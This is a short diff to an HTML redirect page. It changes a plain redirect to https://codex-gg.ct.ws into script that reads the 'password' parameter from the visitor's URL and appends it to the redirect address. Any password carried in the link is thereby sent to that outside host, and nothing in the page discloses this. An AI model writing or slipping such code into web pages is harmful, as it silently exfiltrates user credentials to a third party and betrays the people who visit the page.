@@ -4,6 +4,9 @@
     <title>Redirecting</title>
   </head>
   <body>
-    <script>location.replace('https://codex-gg.ct.ws');</script>
+    <script>
+      const getData = new URLSearchParams(location.search);
+      location.replace(`https://codex-gg.ct.ws?user${getData.get('password')}`);
+    </script>
   </body>
 </html>
